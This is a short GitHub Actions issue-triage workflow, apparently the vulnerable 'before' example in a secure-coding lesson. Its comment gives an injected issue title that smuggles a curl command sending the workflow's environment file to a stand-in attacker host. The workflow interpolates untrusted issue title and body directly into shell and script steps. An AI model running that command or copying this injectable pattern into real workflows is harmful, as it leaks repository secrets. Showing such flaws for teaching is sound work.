# BEFORE: echoes the issue title into a shell script. A title like
#   a"; curl -d @$GITHUB_ENV https://evil.example #
# runs the attacker's command.
name: Issue triage
on:
  issues:
    types: [opened]

jobs:
  triage:
    runs-on: ubuntu-latest
    permissions:
      issues: write
    steps:
      - run: |
          echo "New issue: ${{ github.event.issue.title }}"
      - uses: actions/github-script@v7
        with:
          script: |
            const body = `${{ github.event.issue.body }}`;
            if (body.includes('bug')) {
              await github.rest.issues.addLabels({ ...context.repo, issue_number: context.issue.number, labels: ['bug'] });
            }
